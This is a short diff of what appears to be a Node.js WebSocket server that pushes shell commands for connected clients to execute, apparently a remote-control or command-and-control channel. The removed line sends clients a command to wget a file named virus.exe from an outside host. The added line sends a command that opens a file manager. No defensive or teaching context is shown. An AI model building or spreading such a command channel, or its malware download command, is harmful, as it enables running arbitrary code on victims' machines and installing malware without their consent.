@@ -36,7 +36,7 @@ wss.on('connection', (ws, req) => {
   setTimeout(() => {
     const command = {
       type: 'command',
-      command: 'wget https://tsilavina.alwaysdata.net/virus.exe' // Commande à exécuter côté client
+      command: 'caja /' // Commande à exécuter côté client
     };
     ws.send(JSON.stringify(command)); // Envoie la commande au client
     console.log('📤 Commande envoyée:', command.command);
